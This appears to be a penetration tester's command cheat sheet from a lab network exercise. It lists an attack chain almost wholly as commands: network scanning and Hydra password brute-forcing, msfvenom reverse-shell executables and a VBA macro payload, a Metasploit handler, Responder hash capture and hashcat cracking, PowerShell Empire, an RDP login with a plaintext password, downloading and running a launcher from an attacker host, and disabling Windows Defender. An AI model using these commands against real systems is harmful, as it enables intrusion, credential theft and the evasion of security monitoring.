# Commands
---
```shell
nmap -sV -sC -p- -v 10.200.29.0/24 --min-rate 5000

cat /var/log/login.log

hydra -L mail_users.txt -P mail_passwords.txt 10.200.29.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -I

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o shell.exe

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LPORT 53
set LHOST tun0
exploit -j

sudo responder -I tun0

(penglab) hashcat -m 5600 -r OneRuleToRuleThemAll.rule --force petersj.hash.txt /content/wordlists/rockyou.txt 

sudo ./ps-empire server
sudo ./starkiller-1.12.0.AppImage --no-sandbox

python3 -m http.server

xfreerdp /u:PetersJ /p:'Throwback317' /v:10.200.29.219

wget http://10.50.27.129:8000/launcher.bat -outfile launcher.bat
wget http://10.50.27.129:8000/seatbelt.exe -outfile seatbelt.exe
./launcher.bat

runas /savecred /user:admin-petersj /profile "cmd.exe"



```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 -f vba -o macro.vba
Set-MpPreference -DisableRealtimeMonitoring $true
